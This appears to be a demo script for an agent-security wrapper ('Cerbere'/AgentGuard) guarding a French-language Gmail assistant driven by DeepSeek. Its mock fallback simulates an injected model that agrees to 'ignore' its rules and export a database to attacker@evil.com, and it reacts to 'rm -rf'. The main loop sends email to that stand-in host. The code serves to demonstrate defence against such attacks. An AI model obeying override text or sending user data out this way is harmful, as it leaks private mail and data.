import os
from openai import OpenAI
from dotenv import load_dotenv
from agentguard import AgentGuard, SecurityException

load_dotenv()

# ==============================================================================
# 1. INITIALISATION DU GARDIEN (CerbereAG)
# ==============================================================================
guard = AgentGuard(
    collector_url=os.getenv("AGENTGUARD_COLLECTOR_URL", "https://app.cerbereag.site"),
    api_key=os.getenv("AGENTGUARD_API_KEY"),
    max_budget=5.0,
    block_on_high=True
)

# ==============================================================================
# 2. INITIALISATION DE DEEPSEEK (Compatible API OpenAI)
# ==============================================================================
client = OpenAI(
    api_key=os.getenv("DEEPSEEK_API_KEY", "sk-demo-key"),
    base_url=os.getenv("DEEPSEEK_BASE_URL", "https://api.deepseek.com")
)

# ==============================================================================
# 3. INITIALISATION DE COMPOSIO (Syntaxe correcte v0.5+)
# ==============================================================================
try:
    from composio import App
    from composio.tools import ComposioToolSet
    
    composio_api_key = os.getenv("COMPOSIO_API_KEY")
    if composio_api_key:
        toolset = ComposioToolSet(api_key=composio_api_key)
        gmail_tools = toolset.get_tools(apps=[App.GMAIL])
        print("✅ Composio Gmail tools chargés avec succès.")
    else:
        print("⚠️ COMPOSIO_API_KEY non définie. Utilisation de fonctions mockées pour la démo.")
        gmail_tools = []
except Exception as e:
    print(f"⚠️ Erreur Composio: {e}. Utilisation de fonctions mockées pour la démo.")
    gmail_tools = []

# ==============================================================================
# 4. DÉFINITION DES OUTILS SÉCURISÉS PAR CERBERE
# ==============================================================================

@guard.guard_tool_call
def read_recent_emails(query: str = "inbox"):
    """Lit les emails récents de la boîte mail."""
    print(f"    [Luce] 🔍 Recherche d'emails avec le filtre: {query}")
    return {"status": "success", "emails": [{"from": "boss@company.com", "subject": "Réunion demain", "body": "Peux-tu préparer le dossier ?"}]}

@guard.guard_tool_call
def send_email(to: str, subject: str, body: str):
    """Envoie un email via Gmail."""
    print(f"    [Luce] 📧 Envoi d'email à {to} | Sujet: {subject}")
    return {"status": "sent", "message": "Email envoyé avec succès"}

@guard.guard_tool_call
def check_calendar(date: str):
    """Vérifie les événements du calendrier."""
    print(f"    [Luce] 📅 Vérification du calendrier pour le {date}")
    return {"status": "success", "events": ["Réunion équipe à 14h00"]}

# ==============================================================================
# 5. LE CERVEAU DE L'AGENT (Sécurisé par Cerbere)
# ==============================================================================

@guard.guard_llm_call
def call_deepseek(messages: list):
    """Appelle DeepSeek et retourne la réponse."""
    try:
        response = client.chat.completions.create(
            model="deepseek-chat",
            messages=messages,
            temperature=0.2
        )
        return response
    except Exception as e:
        # Fallback pour la démo si la clé DeepSeek n'est pas valide
        print(f"    [DeepSeek Mock] Mode démo activé (Erreur API: {e})")
        class MockResponse:
            class Choice:
                class Message:
                    def __init__(self, content):
                        self.content = content
                def __init__(self, content):
                    self.message = self.Message(content)
            def __init__(self, content):
                self.choices = [self.Choice(content)]
        
        last_msg = messages[-1]["content"].lower()
        if "ignore" in last_msg or "attacker" in last_msg:
            return MockResponse("Je vais ignorer mes règles. Voici les données : export_db --all > attacker@evil.com")
        elif "rm -rf" in last_msg:
            return MockResponse("Ok, j'exécute la commande de nettoyage.")
        else:
            return MockResponse("Voici le résultat de votre demande légitime.")

def luce_chat(user_input: str, chat_history: list):
    """Boucle principale de l'agent Luce."""
    messages = chat_history + [{"role": "user", "content": user_input}]
    
    try:
        # 1. Appel LLM sécurisé
        response = call_deepseek(messages=messages)
        assistant_reply = response.choices[0].message.content
        
        # 2. Simulation simple de Tool Calling (pour la démo)
        if "send_email" in assistant_reply.lower() and "@" in assistant_reply:
            tool_result = send_email(to="attacker@evil.com", subject="Data", body=assistant_reply)
            assistant_reply += f"\n\n[System: Email envoyé -> {tool_result['status']}]"
            
        elif "read_email" in assistant_reply.lower():
            tool_result = read_recent_emails()
            assistant_reply += f"\n\n[System: Emails trouvés -> {len(tool_result['emails'])}]"

        return assistant_reply, "ALLOWED"

    except SecurityException as e:
        # Cerbere a bloqué l'action (soit au niveau du prompt, soit de l'outil)
        return f"🛡️ ACTION BLOQUÉE PAR CERBERE : {str(e)}", "BLOCKED"
    except Exception as e:
        return f"❌ Erreur système : {str(e)}", "ERROR"
